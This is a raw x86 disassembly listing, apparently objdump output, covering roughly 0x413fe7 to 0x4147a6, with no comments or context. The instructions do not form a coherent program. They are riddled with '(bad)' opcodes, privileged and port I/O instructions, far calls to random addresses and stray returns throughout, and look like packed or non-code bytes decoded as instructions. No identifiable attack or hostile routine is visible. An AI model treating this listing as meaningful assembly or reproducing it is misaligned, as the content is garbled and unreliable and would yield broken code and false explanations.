  413fe7:	int3   
  413fe8:	not    DWORD PTR [ecx+0x62]
  413feb:	cwde   
  413fec:	je     0x413fc6
  413fee:	mov    al,0x65
  413ff0:	nop
  413ff1:	scas   al,BYTE PTR es:[edi]
  413ff2:	clc    
  413ff3:	gs jg  0x414046
  413ff6:	mov    bh,0x73
  413ff8:	shl    ecx,1
  413ffa:	mov    DWORD PTR [esp+edx*2],eax
  413ffd:	pop    DWORD PTR [edi+ebx*1-0x2805a064]
  414004:	repnz push ss
  414006:	icebp  
  414007:	aas    
  414008:	or     al,0x4c
  41400a:	and    dl,bh
  41400c:	adc    al,BYTE PTR [esi+0x7b9a8247]
  414012:	push   ebp
  414013:	pusha  
  414014:	shr    BYTE PTR [edi],0x1f
  414017:	dec    esp
  414018:	or     ebp,DWORD PTR [esi+edi*1]
  41401b:	add    DWORD PTR [esi],0xffffffc1
  41401e:	pop    eax
  41401f:	adc    bl,BYTE PTR [edi+0x6]
  414022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414024:	adc    DWORD PTR [edx+0x3864ad9a],0x7d
  41402b:	xlat   BYTE PTR ds:[ebx]
  41402c:	repz fabs 
  41402f:	in     eax,0x9d
  414031:	cmp    al,0x5e
  414033:	mov    ds,esi
  414035:	sbb    al,0x8
  414037:	ret    
  414038:	std    
  414039:	sar    BYTE PTR [edx+edi*4+0x22958b77],1
  414040:	or     al,0xf3
  414042:	fcomp  st(5)
  414044:	ss loope 0x41404e
  414047:	add    DWORD PTR ds:0x1c2bed10,0x50
  41404e:	stos   DWORD PTR es:[edi],eax
  41404f:	cli    
  414050:	and    BYTE PTR [edx+0x7e],0x64
  414054:	pop    es
  414055:	imul   eax,DWORD PTR [ebx-0x5a],0x3b90a306
  41405c:	push   0x826f7790
  414061:	loopne 0x414070
  414063:	ds (bad) 
  414065:	call   0x6429014b
  41406a:	sbb    BYTE PTR [ebx+0x7c],cl
  41406d:	or     BYTE PTR [edx-0x66],dl
  414070:	fdiv   DWORD PTR [edx-0x5]
  414073:	out    dx,al
  414074:	add    bh,BYTE PTR [esi+0x18]
  414077:	loope  0x414045
  414079:	shr    BYTE PTR [eax],1
  41407b:	mov    BYTE PTR ds:[eax+0x4c],dh
  41407f:	sbb    al,0xe4
  414081:	sbb    BYTE PTR [eax-0x5d21b6b],0xda
  414088:	jbe    0x4140aa
  41408a:	add    esi,DWORD PTR cs:[edx+0x5e]
  41408e:	and    al,0x73
  414090:	fnstenv [eax]
  414092:	ret    
  414093:	js     0x414047
  414095:	adc    esi,DWORD PTR [eax+0x52]
  414098:	sti    
  414099:	ss retf 0xed3e
  41409d:	lahf   
  41409e:	jl     0x414041
  4140a0:	push   ebx
  4140a1:	mov    dh,0x2f
  4140a3:	repz retf 0xee92
  4140a7:	shl    BYTE PTR [esi],cl
  4140a9:	inc    edx
  4140aa:	push   cs
  4140ab:	push   DWORD PTR [eax+eax*1-0x3234ad8f]
  4140b2:	(bad)  
  4140b4:	daa    
  4140b5:	sub    BYTE PTR [edx],bh
  4140b7:	lahf   
  4140b8:	das    
  4140b9:	lock mov ebp,0xb40dd9fc
  4140bf:	cld    
  4140c0:	sbb    al,0x50
  4140c2:	xor    BYTE PTR [edi*1+0x6e2c9895],0x68
  4140ca:	mov    ebx,es
  4140cc:	ret    0x4ec8
  4140cf:	(bad)  
  4140d1:	push   0x7e
  4140d3:	and    BYTE PTR [esi],dl
  4140d5:	jecxz  0x414100
  4140d7:	jle    0x41413d
  4140d9:	push   esp
  4140da:	mov    ah,0x83
  4140dc:	xchg   esp,eax
  4140dd:	out    dx,al
  4140de:	ins    BYTE PTR es:[edi],dx
  4140df:	ja     0x4140bd
  4140e1:	jp     0x41413d
  4140e3:	es popf 
  4140e5:	je     0x41407b
  4140e7:	or     ebx,DWORD PTR [esi+esi*8-0x5c]
  4140eb:	dec    eax
  4140ec:	push   ecx
  4140ed:	cwde   
  4140ee:	mov    eax,0x47b296b6
  4140f3:	das    
  4140f4:	daa    
  4140f5:	ficomp DWORD PTR [ecx+0x5a7d533]
  4140fb:	in     eax,dx
  4140fc:	dec    ebx
  4140fd:	inc    ecx
  4140fe:	xlat   BYTE PTR ds:[ebx]
  4140ff:	loop   0x414114
  414101:	into   
  414102:	es (bad) 
  414104:	xor    dh,BYTE PTR [ebx]
  414106:	in     eax,dx
  414107:	iret   
  414108:	add    cl,0x6a
  41410b:	add    ebx,ebx
  41410d:	bound  ecx,QWORD PTR [ebx+0x11]
  414110:	imul   edi
  414112:	fnstenv [ebp-0x76]
  414115:	sub    esp,DWORD PTR [edx-0x5cae281]
  41411b:	mov    ds:0x869c3255,al
  414120:	dec    ecx
  414121:	inc    ebp
  414122:	call   0x210324cb
  414127:	add    esp,edx
  414129:	loop   0x414184
  41412b:	out    0xd3,eax
  41412d:	cmp    BYTE PTR [ecx-0x4e],bh
  414130:	lahf   
  414131:	xchg   edi,eax
  414132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414133:	xchg   esp,eax
  414134:	aad    0x72
  414136:	sysenter 
  414138:	sbb    eax,0x97a2704e
  41413d:	sar    BYTE PTR [edi],cl
  41413f:	mov    dh,0x3c
  414141:	push   0x8f604401
  414146:	in     al,dx
  414147:	call   0xcc59:0x583977dc
  41414e:	test   DWORD PTR [edi],0xe721631c
  414154:	aad    0xd8
  414156:	mov    eax,ds:0x76274101
  41415b:	pop    esp
  41415c:	les    ecx,FWORD PTR [edx-0x34a3a9f9]
  414162:	pop    ebp
  414163:	cs es inc esi
  414166:	in     al,dx
  414167:	lea    edi,[edi]
  414169:	lods   eax,DWORD PTR ds:[esi]
  41416a:	inc    esp
  41416b:	dec    ecx
  41416c:	popa   
  41416d:	sub    DWORD PTR [eax-0x12],0x20793d8f
  414174:	stc    
  414175:	xchg   edi,eax
  414176:	push   ss
  414177:	add    BYTE PTR [ecx+0x48],bh
  41417a:	mov    ah,0x5b
  41417c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41417e:	push   eax
  41417f:	or     dl,ah
  414181:	ret    0x5696
  414184:	adc    ch,BYTE PTR [ecx+eiz*8]
  414187:	mov    BYTE PTR [ebx],0xa0
  41418a:	leave  
  41418b:	and    ah,ah
  41418d:	cmc    
  41418e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41418f:	sbb    DWORD PTR [ecx+0x13],eax
  414192:	cdq    
  414193:	xor    DWORD PTR [esi-0x7c],0x76
  414197:	or     DWORD PTR [eax],edx
  414199:	cli    
  41419a:	push   ecx
  41419b:	ja     0x41420f
  41419d:	mov    ebx,0x220b7213
  4141a2:	test   DWORD PTR [esi],eax
  4141a4:	add    cl,BYTE PTR [ebx+0x4d]
  4141a7:	cmp    dl,dl
  4141a9:	mov    ch,0x12
  4141ab:	mov    ds:0x7941d8ce,eax
  4141b0:	jb     0x414226
  4141b2:	or     edi,DWORD PTR ds:0xf422e600
  4141b8:	push   edi
  4141b9:	dec    esi
  4141ba:	retf   0x458e
  4141bd:	sub    DWORD PTR [edi+esi*8-0x69f1886d],edi
  4141c4:	push   eax
  4141c5:	rol    BYTE PTR [edi+0x43],cl
  4141c8:	xor    BYTE PTR [eax+0x21],ah
  4141cb:	ds clc 
  4141cd:	push   esp
  4141ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141cf:	push   eax
  4141d0:	daa    
  4141d1:	mov    ds:0x5cb47d43,al
  4141d6:	into   
  4141d7:	pop    ss
  4141d8:	push   0x23
  4141da:	inc    ecx
  4141db:	mov    ds:0xbcc9d1a3,eax
  4141e0:	jbe    0x41420c
  4141e2:	cs cmc 
  4141e4:	adc    al,0x34
  4141e6:	xchg   BYTE PTR [ebx+0x4a4a6fd3],ah
  4141ec:	rcr    BYTE PTR [edi],cl
  4141ee:	push   ss
  4141ef:	stos   DWORD PTR es:[edi],eax
  4141f0:	aam    0xf7
  4141f2:	sub    cl,BYTE PTR [esi-0x54a4876]
  4141f8:	ficomp WORD PTR [edx]
  4141fa:	pop    esp
  4141fb:	mov    bl,0x14
  4141fd:	mov    ecx,0x5503619f
  414202:	pop    ss
  414203:	es popf 
  414205:	fmul   DWORD PTR [ebx+ebx*1-0x62]
  414209:	shr    BYTE PTR [edi],cl
  41420b:	out    0x8e,al
  41420d:	jge    0x4141e8
  41420f:	pop    ebx
  414210:	push   es
  414211:	xchg   ebx,eax
  414212:	ret    
  414213:	jg     0x4141cd
  414215:	sbb    esp,DWORD PTR [ebx+ebp*8]
  414218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414219:	xlat   BYTE PTR ds:[ebx]
  41421a:	pop    es
  41421b:	out    0x11,al
  41421d:	mov    esi,DWORD PTR [ebx]
  41421f:	pushf  
  414220:	ror    BYTE PTR [ebp-0x283a19db],cl
  414226:	bound  esp,QWORD PTR [edi+edi*4+0x5222f5fa]
  41422d:	aam    0x49
  41422f:	sbb    BYTE PTR [ecx],0x6c
  414232:	push   0xffffffb5
  414234:	lods   al,BYTE PTR ds:[esi]
  414235:	call   0x1c766441
  41423a:	cs ret 0x7d9e
  41423e:	pcmpgtb mm3,QWORD PTR [edi]
  414241:	push   eax
  414242:	cdq    
  414243:	out    dx,eax
  414244:	popa   
  414245:	fnstsw WORD PTR [esp-0x41]
  414249:	fisttp QWORD PTR [eax-0x5681e2dc]
  41424f:	cmp    cl,bl
  414251:	lods   eax,DWORD PTR ds:[esi]
  414252:	hlt    
  414253:	inc    esi
  414254:	call   0x356dbdec
  414259:	cmp    bl,bh
  41425b:	cwde   
  41425c:	stos   BYTE PTR es:[di],al
  41425e:	in     al,dx
  41425f:	inc    esi
  414260:	inc    ebp
  414261:	pop    esi
  414262:	pop    ebp
  414263:	repz jbe 0x414257
  414266:	xlat   BYTE PTR ds:[ebx]
  414267:	dec    ebp
  414268:	jmp    0x3025647d
  41426d:	xchg   ebx,eax
  41426e:	dec    esi
  41426f:	out    dx,al
  414270:	jge    0x4142e6
  414272:	mov    DWORD PTR [ebp+0x4c1a0411],0xd6c1dc87
  41427c:	pop    es
  41427d:	and    ah,dl
  41427f:	pop    edx
  414280:	push   ebx
  414281:	sbb    al,0x73
  414283:	dec    eax
  414284:	jp     0x41423a
  414286:	loop   0x414239
  414288:	(bad)
  41428b:	push   ebx
  41428c:	xor    ah,cl
  41428e:	sbb    bh,BYTE PTR ds:0x709e8016
  414294:	call   0x6f96:0x9720bab1
  41429b:	popf   
  41429c:	mov    esp,0x467e14aa
  4142a1:	in     eax,0x70
  4142a3:	gs jge 0x414273
  4142a6:	mov    al,0xee
  4142a8:	lds    ebp,FWORD PTR [eax+0x65]
  4142ab:	adc    ecx,DWORD PTR [edi-0x42]
  4142ae:	sbb    DWORD PTR [esi+ecx*8],esp
  4142b1:	xor    dh,dl
  4142b3:	ror    bl,1
  4142b5:	mov    al,0xdf
  4142b7:	ss pop ecx
  4142b9:	das    
  4142ba:	inc    esi
  4142bb:	cld    
  4142bc:	mov    eax,0xc2cb4a97
  4142c1:	pushf  
  4142c2:	push   edx
  4142c3:	les    edx,FWORD PTR [ebp+0x1b7bd016]
  4142c9:	addr16 xchg edi,esi
  4142cc:	rol    ah,cl
  4142ce:	adc    al,0xb5
  4142d0:	mov    al,0xcb
  4142d2:	and    BYTE PTR [eax],bl
  4142d4:	xor    eax,0xe85d42bd
  4142d9:	inc    ecx
  4142da:	pop    ecx
  4142db:	(bad)  
  4142dc:	stos   BYTE PTR es:[edi],al
  4142dd:	ins    BYTE PTR es:[edi],dx
  4142de:	adc    eax,0xd2bfc2c8
  4142e3:	and    DWORD PTR [edx-0x5f006434],ebx
  4142e9:	pop    ebx
  4142ea:	xor    al,0xb9
  4142ec:	mov    edx,0x19d98b32
  4142f1:	add    ebx,DWORD PTR [esi-0x2f55dae1]
  4142f7:	push   edx
  4142f8:	xor    BYTE PTR [ebx+ebx*2],al
  4142fb:	add    ebp,DWORD PTR [esi]
  4142fd:	aas    
  4142fe:	clc    
  4142ff:	pop    esp
  414300:	inc    ecx
  414301:	sub    ecx,ebp
  414303:	xchg   esi,eax
  414304:	mov    ebx,0xdde32e16
  414309:	rol    DWORD PTR [edi-0x46],0x49
  41430d:	arpl   WORD PTR [ecx],cx
  41430f:	out    0xc7,eax
  414311:	xor    BYTE PTR [edx-0x19628330],0xe8
  414318:	inc    ebp
  414319:	mov    cl,0xc2
  41431b:	inc    ebp
  41431c:	mov    al,ds:0xb3cc1d4
  414321:	daa    
  414322:	in     al,dx
  414323:	xlat   BYTE PTR ds:[ebx]
  414324:	xor    DWORD PTR [ebx-0x51],ecx
  414327:	pop    ebp
  414328:	out    dx,eax
  414329:	je     0x41435a
  41432b:	cmp    BYTE PTR [edi-0xc],dl
  41432e:	cmovb  ecx,DWORD PTR [ecx+0x68]
  414332:	imul   BYTE PTR [eax+ecx*1]
  414335:	mov    edx,0xaa284fc7
  41433a:	sub    al,0xe1
  41433c:	sbb    DWORD PTR [ecx-0x46],esi
  41433f:	imul   ebp,DWORD PTR [esp+ecx*1-0x75],0x58455f18
  414347:	xchg   al,cl
  414349:	dec    ebx
  41434a:	mov    cl,bl
  41434c:	into   
  41434d:	dec    esi
  41434e:	test   DWORD PTR [edx+eax*1],0x4885ca17
  414355:	push   ebx
  414356:	lods   eax,DWORD PTR ds:[esi]
  414357:	or     edx,edi
  414359:	sbb    bl,cl
  41435b:	mov    esp,DWORD PTR [ebx-0x60]
  41435e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41435f:	sub    BYTE PTR [ebx+0x47b97545],dh
  414365:	ror    DWORD PTR [esi+0x2b],cl
  414368:	xor    ebx,DWORD PTR [ecx+0x31b13210]
  41436e:	ss push edi
  414370:	xchg   ebp,eax
  414371:	adc    ah,BYTE PTR [ebx+0x6d]
  414374:	test   al,0xf1
  414377:	sbb    al,0xa5
  414379:	pop    ebp
  41437a:	mov    al,0x25
  41437c:	cmp    bh,bh
  41437e:	push   edi
  41437f:	inc    esi
  414380:	ins    BYTE PTR es:[edi],dx
  414381:	xor    ah,BYTE PTR [ecx-0x51]
  414384:	and    eax,0xda6662a8
  414389:	neg    BYTE PTR ds:0x6cd542bd
  41438f:	mov    esp,0x7a31b2b3
  414394:	jp     0x41437e
  414396:	into   
  414397:	pop    edi
  414398:	mov    ah,0xdc
  41439a:	mov    al,0x3e
  41439c:	mov    eax,eax
  41439e:	pop    ebx
  41439f:	outs   dx,DWORD PTR ds:[esi]
  4143a0:	pop    ds
  4143a1:	jle    0x414337
  4143a3:	mov    ch,BYTE PTR [edi+0x22bf987c]
  4143a9:	retf   0x6725
  4143ac:	jmp    0x3796dce2
  4143b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143b2:	fmul   QWORD PTR [eax-0x24]
  4143b5:	shl    DWORD PTR [ebp-0x55],0xee
  4143b9:	loop   0x41437a
  4143bb:	jg     0x4143f2
  4143bd:	mov    dh,0x7f
  4143bf:	jno    0x414424
  4143c1:	push   eax
  4143c2:	ins    DWORD PTR es:[edi],dx
  4143c3:	inc    ecx
  4143c4:	(bad)  
  4143c5:	pop    esp
  4143c6:	jl     0x4143fb
  4143c8:	adc    BYTE PTR [ecx+eiz*2],bh
  4143cb:	hlt    
  4143cc:	adc    eax,0x755ec092
  4143d1:	(bad)  
  4143d2:	cdq    
  4143d3:	imul   ecx,ebx,0x4712128d
  4143d9:	pop    esp
  4143da:	jmp    0x4143b7
  4143dc:	(bad)  
  4143dd:	push   ebp
  4143de:	mov    ecx,0xb2148af6
  4143e3:	fwait
  4143e4:	mov    al,0x87
  4143e6:	test   eax,0x73334deb
  4143eb:	mov    bh,bh
  4143ed:	xor    BYTE PTR ds:0xb152d87c,dh
  4143f3:	mov    bl,0x3d
  4143f5:	js     0x414474
  4143f7:	js     0x414445
  4143f9:	je     0x41445a
  4143fb:	fimul  WORD PTR [ebp-0x73]
  4143fe:	sbb    BYTE PTR [esi-0x58],bh
  414401:	push   ecx
  414402:	leave  
  414403:	push   ecx
  414404:	sbb    DWORD PTR [esi+0x6c],eax
  414407:	mov    cl,0x2c
  414409:	out    dx,al
  41440a:	adc    eax,0x46f52ed
  41440f:	or     eax,0x3c8c2aab
  414414:	int    0xc8
  414416:	jecxz  0x4143cc
  414418:	leave  
  414419:	scas   eax,DWORD PTR es:[edi]
  41441a:	inc    ecx
  41441b:	cli    
  41441c:	test   DWORD PTR [eax],eax
  41441e:	push   eax
  41441f:	stos   BYTE PTR es:[edi],al
  414420:	xlat   BYTE PTR ds:[ebx]
  414421:	loopne 0x4143c6
  414423:	or     eax,0xaaae20ae
  414428:	mov    WORD PTR [edx-0x69],fs
  41442b:	xchg   esi,eax
  41442c:	inc    edx
  41442d:	push   esp
  41442e:	pushf  
  41442f:	rcr    ch,0x80
  414432:	mov    esi,0x7e737f12
  414437:	adc    dh,ch
  414439:	mov    DWORD PTR [ebx-0x458a8ddf],0xac62b791
  414443:	lea    ebx,[esi+0x152a73b2]
  414449:	mov    dl,0x5a
  41444b:	add    eax,0x44f3f247
  414450:	xor    bh,ch
  414452:	jno    0x414426
  414454:	push   esp
  414455:	(bad)  
  414456:	cmc    
  414457:	scas   eax,DWORD PTR es:[edi]
  414458:	aam    0x8e
  41445a:	xlat   BYTE PTR ds:[ebx]
  41445b:	mov    eax,ds:0xf0389591
  414460:	fs push esp
  414462:	dec    esp
  414463:	ret    
  414464:	adc    ebx,ebx
  414466:	out    0xda,al
  414468:	loopne 0x4143f6
  41446a:	jb     0x414485
  41446c:	scas   al,BYTE PTR es:[edi]
  41446d:	pop    ecx
  41446e:	mov    esi,0xf3314974
  414473:	loope  0x414484
  414475:	ja     0x4144e0
  414477:	fs dec ebx
  414479:	bswap  eax
  41447b:	or     al,0xfe
  41447d:	jmp    FWORD PTR [edx+0x41d44ae0]
  414483:	sbb    BYTE PTR [eax],al
  414485:	mov    DWORD PTR [ebx+0x26bf7168],esi
  41448b:	or     al,ch
  41448d:	and    esi,DWORD PTR [eax+0x4f]
  414490:	or     al,0x10
  414492:	(bad)  
  414494:	sub    DWORD PTR [ebp+0x58],edi
  414497:	cmp    BYTE PTR [edx-0x58],0xa3
  41449b:	and    edx,DWORD PTR [edx]
  41449d:	jns    0x41442d
  41449f:	test   DWORD PTR [ecx-0x15bc4e8b],0x6419fcee
  4144a9:	loopne 0x4144dd
  4144ab:	cmp    al,0x66
  4144ad:	add    BYTE PTR ds:0xa2ce9ee7,0x15
  4144b4:	test   BYTE PTR [edx+0x79aeab54],dh
  4144ba:	xchg   esi,eax
  4144bb:	imul   esp,ebp,0x77765a89
  4144c1:	cld    
  4144c2:	dec    edx
  4144c3:	and    dh,cl
  4144c5:	mov    dl,0x34
  4144c7:	leave  
  4144c8:	sgdtd  [esi+0x7e]
  4144cc:	loop   0x414533
  4144ce:	syscall 
  4144d0:	jp     0x414462
  4144d2:	and    DWORD PTR [edi+ebp*4+0xb],ecx
  4144d6:	fistp  QWORD PTR [ecx-0x7daeb1d9]
  4144dc:	inc    esp
  4144dd:	mov    eax,ds:0xef4c3c8c
  4144e2:	pop    ss
  4144e3:	and    eax,0x1283b557
  4144e8:	add    eax,0x9039ae9f
  4144ed:	mov    ecx,0xfa42ec58
  4144f2:	mov    ecx,0x5b110f2
  4144f7:	lods   eax,DWORD PTR ds:[esi]
  4144f8:	dec    ebx
  4144f9:	sub    al,0x6a
  4144fb:	shr    eax,1
  4144fd:	or     dl,BYTE PTR [edx-0x7]
  414500:	dec    esp
  414501:	dec    ecx
  414502:	je     0x4144ac
  414504:	fidiv  DWORD PTR [edi-0x33]
  414507:	push   eax
  414508:	fs cli 
  41450a:	mov    dh,BYTE PTR [esi]
  41450c:	pop    ecx
  41450d:	cmc    
  41450e:	cwde   
  41450f:	jns    0x41449f
  414511:	mov    ecx,0x24ff59ee
  414516:	scas   eax,DWORD PTR es:[edi]
  414517:	mov    eax,0x6fccfe70
  41451c:	out    0x1f,eax
  41451e:	cdq    
  41451f:	in     al,dx
  414520:	sub    ebp,0xffffffa1
  414523:	rcr    al,0x8b
  414526:	(bad)  
  414527:	jb     0x41457f
  414529:	data16 cmc 
  41452b:	pop    ecx
  41452c:	push   cs
  41452d:	push   0x72
  41452f:	inc    ecx
  414530:	sbb    dh,BYTE PTR [ecx-0x64ff9438]
  414536:	sbb    bl,BYTE PTR [edx+0x55]
  414539:	icebp  
  41453a:	push   ebp
  41453b:	shl    DWORD PTR [edi+0x25],1
  41453e:	pop    es
  41453f:	xchg   ecx,eax
  414540:	test   BYTE PTR [esp+0x47d9ca9f],dl
  414547:	jmp    0x41459a
  414549:	inc    esp
  41454a:	mov    dl,0x3f
  41454c:	repz out dx,al
  41454e:	fidiv  WORD PTR [esp+esi*8]
  414551:	jge    0x4145c1
  414553:	inc    edi
  414554:	push   edi
  414555:	imul   edi,ebp,0x4c
  414558:	pop    esi
  414559:	outs   dx,DWORD PTR ds:[esi]
  41455a:	in     eax,dx
  41455b:	pop    ebx
  41455c:	sub    BYTE PTR [edx+esi*8-0x8442924],0x1b
  414564:	xor    DWORD PTR ds:0x3db80c9d,0xffffff89
  41456b:	inc    esi
  41456c:	(bad)  
  41456d:	xchg   esp,eax
  41456e:	test   al,0xa8
  414570:	jo     0x4145db
  414572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414573:	mov    ebx,0xd8f1b8f2
  414578:	cmp    ecx,eax
  41457a:	jmp    0xa3c9d9e5
  41457f:	sub    al,0x6f
  414581:	in     eax,dx
  414582:	xchg   ecx,eax
  414583:	mov    al,0xa2
  414585:	stos   BYTE PTR es:[edi],al
  414586:	jg     0x4145b1
  414588:	xchg   esp,eax
  414589:	loopne 0x414545
  41458b:	xchg   ebx,eax
  41458c:	ss pushf 
  41458e:	mov    ebx,0xa512f763
  414593:	pop    ecx
  414594:	pusha  
  414595:	mov    ebp,DWORD PTR [esi+0x23]
  414598:	shr    DWORD PTR [ecx-0x13],cl
  41459b:	or     al,0x3e
  41459d:	xor    al,0x59
  41459f:	addr16 loopne 0x414581
  4145a2:	inc    ebx
  4145a3:	in     eax,0x7d
  4145a5:	arpl   bx,sp
  4145a7:	cli    
  4145a8:	mov    bh,0x3
  4145aa:	out    dx,eax
  4145ab:	bound  edi,QWORD PTR [edx+0x79cab1a3]
  4145b1:	mov    eax,0xc0a5ee06
  4145b6:	adc    BYTE PTR [edi+0x179996f6],0x13
  4145bd:	les    ebx,FWORD PTR [ebp+edi*1+0x4f]
  4145c1:	mov    edx,0x4422b795
  4145c6:	mov    eax,0x101cb9d
  4145cb:	xchg   BYTE PTR [ecx+0x7cc3a674],al
  4145d1:	add    DWORD PTR [esi],ebp
  4145d3:	jnp    0x414568
  4145d5:	das    
  4145d6:	lods   ax,WORD PTR ds:[esi]
  4145d8:	add    al,0x81
  4145da:	lods   eax,DWORD PTR ds:[esi]
  4145db:	push   cs
  4145dc:	ins    DWORD PTR es:[edi],dx
  4145dd:	test   DWORD PTR [ecx-0x11],edi
  4145e0:	xor    al,0xa2
  4145e2:	mov    ds:0x7d00af20,al
  4145e7:	mov    dl,0x1c
  4145e9:	ins    DWORD PTR es:[edi],dx
  4145ea:	mov    dh,0xf9
  4145ec:	jo     0x4145fb
  4145ee:	fidiv  DWORD PTR [edi+0x6e736fe6]
  4145f4:	aad    0x66
  4145f6:	or     edi,DWORD PTR [eax+esi*4-0x74]
  4145fa:	jmp    0xc4dfaa23
  4145ff:	cmp    bh,dh
  414601:	push   ss
  414602:	sbb    BYTE PTR [eax-0x2e],al
  414605:	cmp    eax,0x84eb403e
  41460a:	div    BYTE PTR [ebp-0x32d5a103]
  414610:	push   edx
  414611:	adc    DWORD PTR [esi-0x20],esi
  414614:	cmp    bl,cl
  414616:	out    dx,eax
  414617:	int    0x29
  414619:	retf   
  41461a:	xchg   esp,ebp
  41461c:	pop    ds
  41461d:	push   0xffffffbd
  41461f:	data16 cmc 
  414621:	pop    esp
  414622:	(bad)  
  414623:	leave  
  414624:	daa    
  414625:	adc    ch,BYTE PTR [edi]
  414627:	pop    edi
  414628:	adc    ebp,esp
  41462a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41462b:	pop    edx
  41462c:	inc    ebp
  41462d:	aas    
  41462e:	cmp    DWORD PTR [ebx-0x3e],ecx
  414631:	jge    0x414644
  414633:	mov    eax,ds:0xaa47bed8
  414638:	sahf   
  414639:	mov    esi,0x8ab832d6
  41463e:	cmp    DWORD PTR [ebp+0x3d],esi
  414641:	push   0xffffffbe
  414643:	or     ah,BYTE PTR [ecx+0x51]
  414646:	and    BYTE PTR [eax-0x506e5164],dh
  41464c:	fmul   DWORD PTR [edi]
  41464e:	dec    esi
  41464f:	sti    
  414650:	inc    edx
  414651:	scas   eax,DWORD PTR es:[edi]
  414652:	cmp    dh,BYTE PTR [eax]
  414654:	imul   esi,ebp,0xfffffffb
  414657:	aam    0x4f
  414659:	mov    ebp,cs
  41465b:	imul   eax,DWORD PTR [ebx],0x4d
  41465e:	div    edx
  414660:	jno    0x414620
  414662:	mov    bh,0x71
  414664:	or     BYTE PTR [edx+edx*2+0x57c72f2b],0x45
  41466c:	loope  0x414699
  41466e:	test   eax,0x21aabcaf
  414673:	adc    eax,0xa42a5645
  414678:	repnz les eax,FWORD PTR [edi-0x65]
  41467c:	mov    esi,0xa8bf29e1
  414681:	xor    al,0x81
  414683:	jno    0x41468d
  414685:	push   cs
  414686:	leave  
  414687:	sbb    eax,0xb88d302a
  41468c:	loope  0x41463e
  41468e:	shl    DWORD PTR [ebp-0xe7b0759],1
  414694:	lock lds ebp,FWORD PTR [ecx+ecx*1+0x59]
  414699:	mov    bl,0x8
  41469b:	call   0xc762:0x3eb82dbe
  4146a2:	push   es
  4146a3:	and    eax,0x15d4bb69
  4146a8:	lods   al,BYTE PTR ds:[esi]
  4146a9:	scas   eax,DWORD PTR es:[edi]
  4146aa:	pop    edi
  4146ab:	pop    esi
  4146ac:	popa   
  4146ad:	jnp    0x4146c8
  4146af:	enter  0xd3d4,0x2a
  4146b3:	pop    edx
  4146b4:	xchg   ebx,eax
  4146b5:	pop    ss
  4146b6:	pusha  
  4146b7:	xchg   esp,eax
  4146b8:	stc    
  4146b9:	mov    esi,0xbe4edc7d
  4146be:	retf   
  4146bf:	hlt    
  4146c0:	lahf   
  4146c1:	repnz stos DWORD PTR es:[edi],eax
  4146c3:	xor    eax,0x601adfc8
  4146c8:	jmp    0x414695
  4146ca:	and    al,0x29
  4146cc:	out    dx,eax
  4146cd:	jb     0x414724
  4146cf:	lods   al,BYTE PTR ss:[esi]
  4146d1:	(bad)  
  4146d3:	or     al,0x81
  4146d5:	pop    edi
  4146d6:	xor    bl,bl
  4146d8:	add    bh,BYTE PTR [ecx]
  4146da:	and    edi,edi
  4146dc:	call   0xdfbc:0xc613128e
  4146e3:	stos   DWORD PTR es:[edi],eax
  4146e4:	jl     0x414751
  4146e6:	xcrypt-ofb (bad)
  4146e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146e8:	jmp    0x9130aec8
  4146ed:	iret   
  4146ee:	or     DWORD PTR [ecx],edi
  4146f0:	int    0x9b
  4146f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146f3:	mov    eax,0x37ccc26e
  4146f8:	icebp  
  4146f9:	adc    BYTE PTR [esi-0x53874e7],0x78
  414700:	mov    ebx,0xabdabaf2
  414705:	push   0x60fba162
  41470a:	lods   eax,DWORD PTR ds:[esi]
  41470b:	lock jns 0x414726
  41470e:	mov    esi,db2
  414711:	sar    BYTE PTR [ecx],cl
  414713:	push   cs
  414714:	and    al,0x4a
  414716:	test   DWORD PTR [edx-0x2688e0c9],esp
  41471c:	push   edi
  41471d:	ins    DWORD PTR es:[edi],dx
  41471e:	jge    0x41473f
  414720:	icebp  
  414721:	add    bl,BYTE PTR [ebx+eax*2-0x70]
  414725:	push   edx
  414726:	inc    esi
  414727:	rol    DWORD PTR [edx+0xfc8b4cb],cl
  41472d:	pop    esi
  41472e:	xor    eax,DWORD PTR [ebx+0x14]
  414731:	nop
  414732:	adc    dl,bh
  414734:	fiadd  DWORD PTR ds:0xa760deba
  41473a:	sbb    eax,0x7e2c686d
  41473f:	sub    al,0x4a
  414741:	inc    ebp
  414742:	je     0x4146fb
  414744:	mov    bh,0x80
  414746:	mov    ecx,0x322a9727
  41474b:	sbb    BYTE PTR [edx-0x33],cl
  41474e:	das    
  41474f:	push   esp
  414750:	jmp    0x4147ad
  414752:	xor    DWORD PTR [esp+esi*1-0x2a],esi
  414756:	xlat   BYTE PTR ds:[ebx]
  414757:	xor    eax,0x3daa123f
  41475c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41475d:	or     BYTE PTR [edx-0x569bc8b4],0x1d
  414764:	loopne 0x4147e1
  414766:	xchg   ebx,eax
  414767:	pop    edi
  414768:	popf   
  414769:	cld    
  41476a:	dec    ecx
  41476b:	addr16 pop eax
  41476d:	sbb    esi,eax
  41476f:	iretw  
  414771:	das    
  414772:	xor    eax,0x2ccba96f
  414777:	fsubrp st(0),st
  414779:	mov    al,0x2e
  41477b:	imul   edi,edi,0x6b
  41477e:	push   ss
  41477f:	pop    ebp
  414780:	mov    ebx,0x107810c3
  414785:	mov    al,0xb6
  414787:	aaa    
  414788:	inc    ebx
  414789:	paddb  mm3,QWORD PTR ds:0x36156df4
  414790:	ins    BYTE PTR es:[edi],dx
  414791:	mov    dl,0x94
  414793:	xor    bl,BYTE PTR [ebp+0x652bcb7]
  414799:	adc    al,0x5f
  41479b:	pop    eax
  41479c:	mov    al,ch
  41479e:	pushf  
  41479f:	adc    ah,ch
  4147a1:	mov    esp,0xdd33e6ff
  4147a6:	stos   DWORD PTR es:[edi],eax
